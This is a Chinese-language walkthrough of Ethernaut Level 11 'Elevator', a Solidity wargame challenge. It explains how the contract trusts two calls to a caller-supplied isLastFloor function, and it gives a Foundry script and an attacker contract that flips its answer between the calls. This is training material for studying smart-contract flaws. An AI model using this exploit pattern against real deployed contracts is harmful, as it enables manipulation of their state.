# Level 11 - Elevator

## 題目
[Elevator](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)

### 通關條件
這台電梯會讓你到不了頂樓對吧？

### 提示
- 有的時候 Solidity 不是很遵守承諾
- 我們預期這個 Elevator(電梯) 合約會被用在一個 Building(大樓) 合約裡

### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
## 解題
這題的目標是要讓電梯到達頂樓，也就是讓第 9 行的 `top` 等於 true
可以在第 17 行看到 `top` 會透過 `isLastFloor(floor)` 去判斷是否到頂了，而 `isLastFloor(floor)` 在第 5 行寫下它的介面了，這個 function 會接收一個 `uint256` 並回傳 `bool`。所以我們只要實作這個 function 就好了。

但是題目中呼叫 `isLastFloor(floor)` 的地方有兩處，15 行跟 17 行：
```solidity=12
    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
```
`goTo(uint256 _floor)` 的流程：
1. 用 `msg.sender` 建立一個 `Building` 合約
2. 呼叫 `!isLastFloor(_floor)` 做判斷，回傳要是 `False` 才會通過判斷
3. 再次呼叫 `isLastFloor(_floor)`，這次要是 `True` 我們才可以讓 `top = true` 並通關

也就是說，這題的挑戰是如何讓 `isLastFloor(_floor)` 對兩次的呼叫給不同的回應。
其實作法很簡單，只需要多宣告一個狀態變數紀錄上次回傳的值就好；這樣就可以知道下次要換另一個值回傳，攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/11_Elevator.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        ElevatorAttacker elevatorAttacker = new ElevatorAttacker();
        elevatorAttacker.attack();

        vm.stopBroadcast();
    }
}

contract ElevatorAttacker {
    Elevator level11 = Elevator(your_challenge_address);
    bool public floor = true;

    function attack() public{
        level11.goTo(0);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        floor = !floor;
        return floor;
    }
}
```